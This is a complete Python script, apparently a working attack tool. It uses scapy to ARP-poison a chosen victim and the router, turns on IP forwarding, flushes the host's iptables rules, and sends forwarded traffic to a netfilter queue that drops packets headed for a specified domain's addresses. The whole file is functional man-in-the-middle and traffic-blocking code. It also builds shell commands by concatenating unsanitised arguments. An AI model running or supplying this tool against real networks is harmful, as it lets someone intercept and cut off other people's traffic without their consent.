#!/usr/bin/python
from scapy.all import *
from multiprocessing import Process
import time
import argparse
import os
import sys
import nfqueue
import re

def getRouter(interface):
    return os.popen("ip route | grep " + interface).read().splitlines()[0].split()[2]

def getOwnIp(interface):
    return os.popen('ip addr show ' + interface).read().split('inet ')[1].split('/')[0]

def getMAC(args):
    ownMac = open('/sys/class/net/' + args.interface + '/address').read().strip()
    victimMac = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.victim).read().splitlines()[1])[0][1:-1]
    routerMac = re.findall('\[.*\]', os.popen('arping -c 1 -I ' + args.interface + ' ' + args.router).read().splitlines()[1])[0][1:-1]
    return ownMac, victimMac, routerMac

def getArguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('victim', help='IP address of a victim')
    parser.add_argument('--domain', '-d', required=True, help='Domain to block')
    parser.add_argument('--interface', '-i', default='wlan0', help='Interface to use, default is wlan0')
    parser.add_argument('--router', '-r', default=None, help='IP address of a router')
    args = parser.parse_args()
    if args.router == None:
        args.router = getRouter(args.interface)
    args.ownIp = getOwnIp(args.interface)
    args.ownMac, args.victimMac, args.routerMac = getMAC(args)
    return args

def nslookup(domain):
    ips = [line.split()[1] for line in os.popen("nslookup " + domain + " | grep Address").read().splitlines()]
    ips.pop(0)
    return ips

def osConfiguration(args):
    sysFile = open("/proc/sys/net/ipv4/ip_forward", "w")
    sysFile.write('1')
    sysFile.close()
    sysFile = open("/proc/sys/net/ipv4/conf/" + args.interface + "/send_redirects", "w")
    sysFile.write('0')
    sysFile.close()
 
    os.system("iptables -Z")
    os.system("iptables -F")
    os.system("iptables -X")
    os.system("iptables --append FORWARD --in-interface " +  args.interface + " -j NFQUEUE")
    os.system("iptables -t nat --append POSTROUTING --out-interface " + args.interface + " -j MASQUERADE")

def callback(payload):
    data = payload.get_data()
    packet = IP(data)
    print("Packet src: " + packet.src + " | Packet dst: " + packet.dst)
    if packet.dst in domainIps:
        payload.set_verdict(nfqueue.NF_DROP)
    else:
        payload.set_verdict(nfqueue.NF_ACCEPT)
 
def createNetFilterQueue():
    queue = nfqueue.queue()
    queue.open()
    queue.bind(socket.AF_INET)
    queue.set_callback(callback)
    queue.create_queue(0)
    return queue

def arpPoison(args):
    conf.iface= args.interface
    victimPacket = ARP(op='is-at', hwsrc=args.ownMac)
    routerPacket = ARP(op='is-at', hwsrc=args.ownMac)
    victimPacket.psrc = args.router
    victimPacket.pdst = args.victim
    victimPacket.hwdst = args.victimMac
    routerPacket.psrc = args.victim
    routerPacket.pdst = args.router
    routerPacket.hwdst = args.routerMac
    while True:
        send(victimPacket, verbose=False)
        send(routerPacket, verbose=False)
        time.sleep(5.0)
 
args = getArguments()
domainIps = nslookup(args.domain)
osConfiguration(args)
queue = createNetFilterQueue()
arpPoisonDaemon = Process(target=arpPoison, args=(args,))
arpPoisonDaemon.daemon = True
arpPoisonDaemon.start()
try:
    queue.try_run() 
except KeyboardInterrupt:
    queue.unbind(socket.AF_INET)
    queue.close()
    arpPoisonDaemon.terminate()
    os.system('iptables -Z')
    os.system('iptables -F')
    os.system('iptables -X')
